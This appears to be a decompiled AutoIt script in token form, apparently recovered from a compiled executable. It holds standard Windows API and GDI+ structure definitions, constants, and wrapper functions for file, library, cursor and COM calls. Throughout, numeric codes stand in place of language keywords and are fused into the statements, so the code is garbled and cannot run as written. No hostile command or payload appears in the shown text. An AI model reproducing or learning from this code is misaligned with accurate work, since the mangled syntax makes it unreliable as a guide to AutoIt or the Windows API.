2930$GDIP_COLORADJUSTTYPE_BITMAP=1
2930$GDIP_COLORADJUSTTYPE_BRUSH=2
2930$GDIP_COLORADJUSTTYPE_PEN=3
2930$GDIP_COLORADJUSTTYPE_TEXT=4
2930$GDIP_COLORADJUSTTYPE_COUNT=5
2930$GDIP_COLORADJUSTTYPE_ANY=6
2930$TAGPOINT="struct;long X;long Y;endstruct"
2930$TAGRECT="struct;long Left;long Top;long Right;long Bottom;endstruct"
2930$TAGSIZE="struct;long X;long Y;endstruct"
2930$TAGMARGINS="int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
2930$TAGFILETIME="struct;dword Lo;dword Hi;endstruct"
2930$TAGSYSTEMTIME="struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
2930$TAGTIME_ZONE_INFORMATION="struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
2930$TAGNMHDR="struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
2930$TAGCOMBOBOXEXITEM="uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;"&"int Indent;lparam Param"
2930$TAGNMCBEDRAGBEGIN=$TAGNMHDR&";int ItemID;wchar szText[260]"
2930$TAGNMCBEENDEDIT=$TAGNMHDR&";bool fChanged;int NewSelection;wchar szText[260];int Why"
2930$TAGNMCOMBOBOXEX=$TAGNMHDR&";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;"&"int SelectedImage;int OverlayImage;int Indent;lparam Param"
2930$TAGDTPRANGE="word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;"&"word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;"&"word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
2930$TAGNMDATETIMECHANGE=$TAGNMHDR&";dword Flag;"&$TAGSYSTEMTIME
2930$TAGNMDATETIMEFORMAT=$TAGNMHDR&";ptr Format;"&$TAGSYSTEMTIME&";ptr pDisplay;wchar Display[64]"
2930$TAGNMDATETIMEFORMATQUERY=$TAGNMHDR&";ptr Format;struct;long SizeX;long SizeY;endstruct"
2930$TAGNMDATETIMEKEYDOWN=$TAGNMHDR&";int VirtKey;ptr Format;"&$TAGSYSTEMTIME
2930$TAGNMDATETIMESTRING=$TAGNMHDR&";ptr UserString;"&$TAGSYSTEMTIME&";dword Flags"
2930$TAGEVENTLOGRECORD="dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;"&"word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;"&"dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
2930$TAGGDIP_EFFECTPARAMS_BLUR="float Radius; bool ExpandEdge"
2930$TAGGDIP_EFFECTPARAMS_BRIGHTNESSCONTRAST="int BrightnessLevel; int ContrastLevel"
2930$TAGGDIP_EFFECTPARAMS_COLORBALANCE="int CyanRed; int MagentaGreen; int YellowBlue"
2930$TAGGDIP_EFFECTPARAMS_COLORCURVE="int Adjustment; int Channel; int AdjustValue"
2930$TAGGDIP_EFFECTPARAMS_COLORLUT="byte LutB[256]; byte LutG[256]; byte LutR[256]; byte LutA[256]"
2930$TAGGDIP_EFFECTPARAMS_HUESATURATIONLIGHTNESS="int HueLevel; int SaturationLevel; int LightnessLevel"
2930$TAGGDIP_EFFECTPARAMS_LEVELS="int Highlight; int Midtone; int Shadow"
2930$TAGGDIP_EFFECTPARAMS_REDEYECORRECTION="uint NumberOfAreas; ptr Areas"
2930$TAGGDIP_EFFECTPARAMS_SHARPEN="float Radius; float Amount"
2930$TAGGDIP_EFFECTPARAMS_TINT="int Hue; int Amount"
2930$TAGGDIPBITMAPDATA="uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
2930$TAGGDIPCOLORMATRIX="float m[25]"
2930$TAGGDIPENCODERPARAM="struct;byte GUID[16];ulong NumberOfValues;ulong Type;ptr Values;endstruct"
2930$TAGGDIPENCODERPARAMS="uint Count;"&$TAGGDIPENCODERPARAM
2930$TAGGDIPRECTF="struct;float X;float Y;float Width;float Height;endstruct"
2930$TAGGDIPSTARTUPINPUT="uint Version;ptr Callback;bool NoThread;bool NoCodecs"
2930$TAGGDIPSTARTUPOUTPUT="ptr HookProc;ptr UnhookProc"
2930$TAGGDIPIMAGECODECINFO="byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;"&"ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
2930$TAGGDIPPENCODERPARAMS="uint Count;byte Params[1]"
2930$TAGHDITEM="uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
2930$TAGNMHDDISPINFO=$TAGNMHDR&";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
2930$TAGNMHDFILTERBTNCLICK=$TAGNMHDR&";int Item;"&$TAGRECT
2930$TAGNMHEADER=$TAGNMHDR&";int Item;int Button;ptr pItem"
2930$TAGGETIPADDRESS="byte Field4;byte Field3;byte Field2;byte Field1"
2930$TAGNMIPADDRESS=$TAGNMHDR&";int Field;int Value"
2930$TAGLVFINDINFO="struct;uint Flags;ptr Text;lparam Param;"&$TAGPOINT&";uint Direction;endstruct"
2930$TAGLVHITTESTINFO=$TAGPOINT&";uint Flags;int Item;int SubItem;int iGroup"
2930$TAGLVITEM="struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;"&"int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
2930$TAGNMLISTVIEW=$TAGNMHDR&";int Item;int SubItem;uint NewState;uint OldState;uint Changed;"&"struct;long ActionX;long ActionY;endstruct;lparam Param"
2930$TAGNMLVCUSTOMDRAW="struct;"&$TAGNMHDR&";dword dwDrawStage;handle hdc;"&$TAGRECT&";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct"&";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;"&"int iIconPhase;int iPartID;int iStateID;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
2930$TAGNMLVDISPINFO=$TAGNMHDR&";"&$TAGLVITEM
2930$TAGNMLVFINDITEM=$TAGNMHDR&";int Start;"&$TAGLVFINDINFO
2930$TAGNMLVGETINFOTIP=$TAGNMHDR&";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
2930$TAGNMITEMACTIVATE=$TAGNMHDR&";int Index;int SubItem;uint NewState;uint OldState;uint Changed;"&$TAGPOINT&";lparam lParam;uint KeyFlags"
2930$TAGNMLVKEYDOWN="align 1;"&$TAGNMHDR&";word VKey;uint Flags"
2930$TAGNMLVSCROLL=$TAGNMHDR&";int DX;int DY"
2930$TAGMCHITTESTINFO="uint Size;"&$TAGPOINT&";uint Hit;"&$TAGSYSTEMTIME&";"&$TAGRECT&";int iOffset;int iRow;int iCol"
2930$TAGMCMONTHRANGE="word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;"&"word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;"&"word MaxMSeconds;short Span"
2930$TAGMCRANGE="word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;"&"word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;"&"word MaxMSeconds;short MinSet;short MaxSet"
2930$TAGMCSELRANGE="word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;"&"word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;"&"word MaxMSeconds"
2930$TAGNMDAYSTATE=$TAGNMHDR&";"&$TAGSYSTEMTIME&";int DayState;ptr pDayState"
2930$TAGNMSELCHANGE=$TAGNMHDR&";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;"&"struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
2930$TAGNMOBJECTNOTIFY=$TAGNMHDR&";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
2930$TAGNMTCKEYDOWN="align 1;"&$TAGNMHDR&";word VKey;uint Flags"
2930$TAGTVITEM="struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;"&"int Children;lparam Param;endstruct"
2930$TAGTVITEMEX="struct;"&$TAGTVITEM&";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
2930$TAGNMTREEVIEW=$TAGNMHDR&";uint Action;"&"struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;"&"ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;"&"struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;"&"ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;"&"struct;long PointX;long PointY;endstruct"
2930$TAGNMTVCUSTOMDRAW="struct;"&$TAGNMHDR&";dword DrawStage;handle HDC;"&$TAGRECT&";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct"&";dword ClrText;dword ClrTextBk;int Level"
2930$TAGNMTVDISPINFO=$TAGNMHDR&";"&$TAGTVITEM
2930$TAGNMTVGETINFOTIP=$TAGNMHDR&";ptr Text;int TextMax;handle hItem;lparam lParam"
2930$TAGNMTVITEMCHANGE=$TAGNMHDR&";uint Changed;handle hItem;uint StateNew;uint StateOld;lparam lParam;"
2930$TAGTVHITTESTINFO=$TAGPOINT&";uint Flags;handle Item"
2930$TAGNMTVKEYDOWN="align 1;"&$TAGNMHDR&";word VKey;uint Flags"
2930$TAGNMMOUSE=$TAGNMHDR&";dword_ptr ItemSpec;dword_ptr ItemData;"&$TAGPOINT&";lparam HitInfo"
2930$TAGTOKEN_PRIVILEGES="dword Count;align 4;int64 LUID;dword Attributes"
2930$TAGIMAGEINFO="handle hBitmap;handle hMask;int Unused1;int Unused2;"&$TAGRECT
2930$TAGMENUINFO="dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
2930$TAGMENUITEMINFO="uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;"&"ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
2930$TAGREBARBANDINFO="uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;"&"int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;"&"uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader"&((@OSVERSION="WIN_XP")""";"&$TAGRECT&";uint uChevronState")
2930$TAGNMREBARAUTOBREAK=$TAGNMHDR&";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
2930$TAGNMRBAUTOSIZE=$TAGNMHDR&";bool fChanged;"&"struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;"&"struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
2930$TAGNMREBAR=$TAGNMHDR&";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
2930$TAGNMREBARCHEVRON=$TAGNMHDR&";uint uBand;uint wID;lparam lParam;"&$TAGRECT&";lparam lParamNM"
2930$TAGNMREBARCHILDSIZE=$TAGNMHDR&";uint uBand;uint wID;"&"struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;"&"struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
2930$TAGCOLORSCHEME="dword Size;dword BtnHighlight;dword BtnShadow"
2930$TAGNMTOOLBAR=$TAGNMHDR&";int iItem;"&"struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct"&";int cchText;ptr pszText;"&$TAGRECT
2930$TAGNMTBHOTITEM=$TAGNMHDR&";int idOld;int idNew;dword dwFlags"
2930$TAGTBBUTTON="int Bitmap;int Command;byte State;byte Style;dword_ptr Param;int_ptr String"
2930$TAGTBBUTTONINFO="uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
2930$TAGNETRESOURCE="dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
2930$TAGOVERLAPPED="ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
2930$TAGOPENFILENAME="dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;"&"dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;"&"ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;"&"ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
2930$TAGBITMAPINFOHEADER="struct;dword biSize;long biWidth;long biHeight;word biPlanes;word biBitCount;"&"dword biCompression;dword biSizeImage;long biXPelsPerMeter;long biYPelsPerMeter;dword biClrUsed;dword biClrImportant;endstruct"
2930$TAGBITMAPINFO=$TAGBITMAPINFOHEADER&";dword biRGBQuad[1]"
2930$TAGBLENDFUNCTION="byte Op;byte Flags;byte Alpha;byte Format"
2930$TAGGUID="struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
2930$TAGWINDOWPLACEMENT="uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
2930$TAGWINDOWPOS="hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
2930$TAGSCROLLINFO="uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
2930$TAGSCROLLBARINFO="dword cbSize;"&$TAGRECT&";int dxyLineButton;int xyThumbTop;"&"int xyThumbBottom;int reserved;dword rgstate[6]"
2930$TAGLOGFONT="struct;long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;"&"byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
2930$TAGKBDLLHOOKSTRUCT="dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
2930$TAGPROCESS_INFORMATION="handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
2930$TAGSTARTUPINFO="dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;"&"dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;"&"handle StdOutput;handle StdError"
2930$TAGSECURITY_ATTRIBUTES="dword Length;ptr Descriptor;bool InheritHandle"
2930$TAGWIN32_FIND_DATA="dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
2930$TAGTEXTMETRIC="long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;"&"long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;"&"wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;"&"byte tmPitchAndFamily;byte tmCharSet"
2930$COINIT_APARTMENTTHREADED=2
2930$COINIT_DISABLE_OLE1DDE=4
2930$COINIT_MULTITHREADED=0
2930$COINIT_SPEED_OVER_MEMORY=8
29$__G_VENUM,$__G_VEXT=0
29$__G_IRGBMODE=1
2930$TAGOSVERSIONINFO="struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
2930$IMAGE_BITMAP=0
2930$IMAGE_ICON=1
2930$IMAGE_CURSOR=2
2930$IMAGE_ENHMETAFILE=3
2930$LR_DEFAULTCOLOR=0
2930$LR_MONOCHROME=1
2930$LR_COLOR=2
2930$LR_COPYRETURNORG=4
2930$LR_COPYDELETEORG=8
2930$LR_LOADFROMFILE=16
2930$LR_LOADTRANSPARENT=32
2930$LR_DEFAULTSIZE=64
2930$LR_VGACOLOR=128
2930$LR_LOADMAP3DCOLORS=4096
2930$LR_CREATEDIBSECTION=8192
2930$LR_COPYFROMRESOURCE=16384
2930$LR_SHARED=32768
2930$__TAGCURSORINFO="dword Size;dword Flags;handle hCursor;"&"struct;long X;long Y;endstruct"
2930$__WINVER=__WINVER()
32_WINAPI_CREATEFILE($SFILENAME,$ICREATION,$IACCESS=4,$ISHARE=0,$IATTRIBUTES=0,$TSECURITY=0)
28$IDA=0,$ISM=0,$ICD=0,$IFA=0
417($IACCESS,1)<>05$IDA=19($IDA,$GENERIC_EXECUTE)
417($IACCESS,2)<>05$IDA=19($IDA,$GENERIC_READ)
417($IACCESS,4)<>05$IDA=19($IDA,$GENERIC_WRITE)
417($ISHARE,1)<>05$ISM=19($ISM,$FILE_SHARE_DELETE)
417($ISHARE,2)<>05$ISM=19($ISM,$FILE_SHARE_READ)
417($ISHARE,4)<>05$ISM=19($ISM,$FILE_SHARE_WRITE)
23$ICREATION
210
$ICD=$CREATE_NEW
211
$ICD=$CREATE_ALWAYS
212
$ICD=$OPEN_EXISTING
213
$ICD=$OPEN_ALWAYS
214
$ICD=$TRUNCATE_EXISTING
24
417($IATTRIBUTES,1)<>05$IFA=19($IFA,$FILE_ATTRIBUTE_ARCHIVE)
417($IATTRIBUTES,2)<>05$IFA=19($IFA,$FILE_ATTRIBUTE_HIDDEN)
417($IATTRIBUTES,4)<>05$IFA=19($IFA,$FILE_ATTRIBUTE_READONLY)
417($IATTRIBUTES,8)<>05$IFA=19($IFA,$FILE_ATTRIBUTE_SYSTEM)
28$ARESULT=58("kernel32.dll","handle","CreateFileW","wstr",$SFILENAME,"dword",$IDA,"dword",$ISM,"struct*",$TSECURITY,"dword",$ICD,"dword",$IFA,"ptr",0)
4@ERROR2($ARESULT[0]=273(-1))534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_FREELIBRARY($HMODULE)
28$ARESULT=58("kernel32.dll","bool","FreeLibrary","handle",$HMODULE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_GETCURSORINFO()
28$TCURSOR=65($__TAGCURSORINFO)
28$ICURSOR=68($TCURSOR)
69($TCURSOR,"Size",$ICURSOR)
28$ARET=58("user32.dll","bool","GetCursorInfo","struct*",$TCURSOR)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$ACURSOR[5]
$ACURSOR[0]=39
$ACURSOR[1]=66($TCURSOR,"Flags")<>0
$ACURSOR[2]=66($TCURSOR,"hCursor")
$ACURSOR[3]=66($TCURSOR,"X")
$ACURSOR[4]=66($TCURSOR,"Y")
34$ACURSOR
33
32_WINAPI_GETDLGCTRLID($HWND)
28$ARESULT=58("user32.dll","int","GetDlgCtrlID","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETMODULEHANDLE($SMODULENAME)
28$SMODULENAMETYPE="wstr"
4$SMODULENAME=""5
$SMODULENAME=0
$SMODULENAMETYPE="ptr"
8
28$ARESULT=58("kernel32.dll","handle","GetModuleHandleW",$SMODULENAMETYPE,$SMODULENAME)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETSTRING($PSTRING,$BUNICODE=39)
28$ILENGTH=_WINAPI_STRLEN($PSTRING,$BUNICODE)
4@ERROR23$ILENGTH534287(@ERROR+10,@EXTENDED,"")
28$TSTRING=65(($BUNICODE"wchar""char")&"["&($ILENGTH+1)&"]",$PSTRING)
4@ERROR534287(@ERROR,@EXTENDED,"")
34288($ILENGTH,66($TSTRING,1))
33
32_WINAPI_ISWOW64PROCESS($IPID=0)
43$IPID5$IPID=@AUTOITPID
28$HPROCESS=58("kernel32.dll","handle","OpenProcess","dword",($__WINVER<153610244096),"bool",0,"dword",$IPID)
4@ERROR23$HPROCESS[0]534287(@ERROR+20,@EXTENDED,40)
28$ARET=58("kernel32.dll","bool","IsWow64Process","handle",$HPROCESS[0],"bool*",0)
4__CHECKERRORCLOSEHANDLE($ARET,$HPROCESS[0])534287(@ERROR,@EXTENDED,40)
34$ARET[2]
33
32_WINAPI_LOADIMAGE($HINSTANCE,$SIMAGE,$ITYPE,$IXDESIRED,$IYDESIRED,$ILOAD)
28$ARESULT,$SIMAGETYPE="int"
4233($SIMAGE)5$SIMAGETYPE="wstr"
$ARESULT=58("user32.dll","handle","LoadImageW","handle",$HINSTANCE,$SIMAGETYPE,$SIMAGE,"uint",$ITYPE,"int",$IXDESIRED,"int",$IYDESIRED,"uint",$ILOAD)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_LOADLIBRARY($SFILENAME)
28$ARESULT=58("kernel32.dll","handle","LoadLibraryW","wstr",$SFILENAME)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_PATHISDIRECTORY($SFILEPATH)
28$ARET=58("shlwapi.dll","bool","PathIsDirectoryW","wstr",$SFILEPATH)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_READFILE($HFILE,$PBUFFER,$ITOREAD,36$IREAD,$TOVERLAPPED=0)
28$ARESULT=58("kernel32.dll","bool","ReadFile","handle",$HFILE,"struct*",$PBUFFER,"dword",$ITOREAD,"dword*",0,"struct*",$TOVERLAPPED)
4@ERROR534287(@ERROR,@EXTENDED,40)
$IREAD=$ARESULT[4]
34$ARESULT[0]
33
32_WINAPI_STRLEN($PSTRING,$BUNICODE=39)
28$W=""
4$BUNICODE5$W="W"
28$ARET=58("kernel32.dll","int","lstrlen"&$W,"struct*",$PSTRING)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SWITCHCOLOR($ICOLOR)
4$ICOLOR=-1534$ICOLOR
3419(17($ICOLOR,65280),21(17($ICOLOR,255),-16),21(17($ICOLOR,16711680),16))
33
32_WINAPI_WRITEFILE($HFILE,$PBUFFER,$ITOWRITE,36$IWRITTEN,$TOVERLAPPED=0)
28$ARESULT=58("kernel32.dll","bool","WriteFile","handle",$HFILE,"struct*",$PBUFFER,"dword",$ITOWRITE,"dword*",0,"struct*",$TOVERLAPPED)
4@ERROR534287(@ERROR,@EXTENDED,40)
$IWRITTEN=$ARESULT[4]
34$ARESULT[0]
33
32__CHECKERRORARRAYBOUNDS(3036$ADATA,36$ISTART,36$IEND,$NDIM=1,$IDIM=$UBOUND_DIMENSIONS)
43219($ADATA)534287(1,0,1)
4369($ADATA,$IDIM)<>$NDIM534287(2,0,1)
4$ISTART<05$ISTART=0
28$IUBOUND=369($ADATA)-1
4$IEND<12$IEND>$IUBOUND5$IEND=$IUBOUND
4$ISTART>$IEND534287(4,0,1)
340
33
32__CHECKERRORCLOSEHANDLE($ARET,$HFILE,$BLASTERROR=40,$ICURERR=@ERROR,$ICUREXT=@EXTENDED)
43$ICURERR13$ARET[0]5$ICURERR=10
28$ALASTERROR=58("kernel32.dll","dword","GetLastError")
58("kernel32.dll","bool","CloseHandle","handle",$HFILE)
4$ICURERR558("kernel32.dll","none","SetLastError","dword",$ALASTERROR[0])
4$BLASTERROR5$ICUREXT=$ALASTERROR[0]
34287($ICURERR,$ICUREXT,$ICURERR)
33
32__DLL($SPATH,$BPIN=40)
28$ARET=58("kernel32.dll","bool","GetModuleHandleExW","dword",($BPIN12),"wstr",$SPATH,"ptr*",0)
43$ARET[3]5
28$ARESULT=58("kernel32.dll","handle","LoadLibraryW","wstr",$SPATH)
43$ARESULT[0]5340
8
341
33
32__ENUMWINDOWSPROC($HWND,$BVISIBLE)
28$ARESULT
4$BVISIBLE5
$ARESULT=58("user32.dll","bool","IsWindowVisible","hwnd",$HWND)
43$ARESULT[0]5
341
8
8
__INC($__G_VENUM)
$__G_VENUM[$__G_VENUM[0][0]][0]=$HWND
$ARESULT=58("user32.dll","int","GetClassNameW","hwnd",$HWND,"wstr","","int",4096)
$__G_VENUM[$__G_VENUM[0][0]][1]=$ARESULT[2]
341
33
32__FATALEXIT($ICODE,$STEXT="")
4$STEXT5249($MB_SYSTEMMODAL,"AutoIt",$STEXT)
58("kernel32.dll","none","FatalExit","int",$ICODE)
33
32__INC(36$ADATA,$IINCREMENT=100)
20
21369($ADATA,$UBOUND_COLUMNS)
4$IINCREMENT<05
27$ADATA[$ADATA[0][0]+1][369($ADATA,$UBOUND_COLUMNS)]
6
$ADATA[0][0]+=1
4$ADATA[0][0]>369($ADATA)-15
27$ADATA[$ADATA[0][0]+$IINCREMENT][369($ADATA,$UBOUND_COLUMNS)]
8
8
21369($ADATA,$UBOUND_ROWS)
4$IINCREMENT<05
27$ADATA[$ADATA[0]+1]
6
$ADATA[0]+=1
4$ADATA[0]>369($ADATA)-15
27$ADATA[$ADATA[0]+$IINCREMENT]
8
8
216
340
22
341
33
32__RGB($ICOLOR)
4$__G_IRGBMODE5
$ICOLOR=_WINAPI_SWITCHCOLOR($ICOLOR)
8
34$ICOLOR
33
32__WINVER()
28$TOSVI=65($TAGOSVERSIONINFO)
69($TOSVI,1,68($TOSVI))
28$ARET=58("kernel32.dll","bool","GetVersionExW","struct*",$TOSVI)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
3419(21(66($TOSVI,2),-8),66($TOSVI,3))
33
2930$__TAGWINAPICOM_GUID="struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
32_WINAPI_CLSIDFROMPROGID($SPROGID)
28$TGUID=65($__TAGWINAPICOM_GUID)
28$ARETURN=58("ole32.dll","long","CLSIDFromProgID","wstr",$SPROGID,"struct*",$TGUID)
4@ERROR534287(@ERROR,@EXTENDED,"")
4$ARETURN[0]534287(10,$ARETURN[0],"")
$ARETURN=58("ole32.dll","int","StringFromGUID2","struct*",$TGUID,"wstr","","int",39)
4@ERROR23$ARETURN[0]534287(@ERROR+20,@EXTENDED,"")
34$ARETURN[2]
33
32_WINAPI_COINITIALIZE($IFLAGS=0)
28$ARETURN=58("ole32.dll","long","CoInitializeEx","ptr",0,"dword",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARETURN[0]534287(10,$ARETURN[0],0)
341
33
32_WINAPI_COTASKMEMALLOC($ISIZE)
28$ARETURN=58("ole32.dll","ptr","CoTaskMemAlloc","uint_ptr",$ISIZE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARETURN[0]
33
32_WINAPI_COTASKMEMFREE($PMEMORY)
58("ole32.dll","none","CoTaskMemFree","ptr",$PMEMORY)
4@ERROR534287(@ERROR,@EXTENDED,0)
341
33
32_WINAPI_COTASKMEMREALLOC($PMEMORY,$ISIZE)
28$ARETURN=58("ole32.dll","ptr","CoTaskMemRealloc","ptr",$PMEMORY,"ulong_ptr",$ISIZE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARETURN[0]
33
32_WINAPI_COUNINITIALIZE()
58("ole32.dll","none","CoUninitialize")
4@ERROR534287(@ERROR,@EXTENDED,0)
341
33
32_WINAPI_CREATEGUID()
28$TGUID=65($__TAGWINAPICOM_GUID)
28$ARETURN=58("ole32.dll","long","CoCreateGuid","struct*",$TGUID)
4@ERROR534287(@ERROR,@EXTENDED,"")
4$ARETURN[0]534287(10,$ARETURN[0],"")
$ARETURN=58("ole32.dll","int","StringFromGUID2","struct*",$TGUID,"wstr","","int",65536)
4@ERROR23$ARETURN[0]534287(@ERROR+20,@EXTENDED,"")
34$ARETURN[2]
33
32_WINAPI_CREATESTREAMONHGLOBAL($HGLOBAL=0,$BDELETEONRELEASE=39)
28$ARETURN=58("ole32.dll","long","CreateStreamOnHGlobal","handle",$HGLOBAL,"bool",$BDELETEONRELEASE,"ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARETURN[0]534287(10,$ARETURN[0],0)
34$ARETURN[3]
33
32_WINAPI_GETHGLOBALFROMSTREAM($PSTREAM)
28$ARETURN=58("ole32.dll","uint","GetHGlobalFromStream","ptr",$PSTREAM,"ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARETURN[0]534287(10,$ARETURN[0],0)
34$ARETURN[2]
33
32_WINAPI_PROGIDFROMCLSID($SCLSID)
28$TGUID=65($__TAGWINAPICOM_GUID)
28$ARETURN=58("ole32.dll","uint","CLSIDFromString","wstr",$SCLSID,"struct*",$TGUID)
4@ERROR2$ARETURN[0]534287(@ERROR+20,@EXTENDED,"")
$ARETURN=58("ole32.dll","uint","ProgIDFromCLSID","struct*",$TGUID,"ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,"")
4$ARETURN[0]534287(10,$ARETURN[0],"")
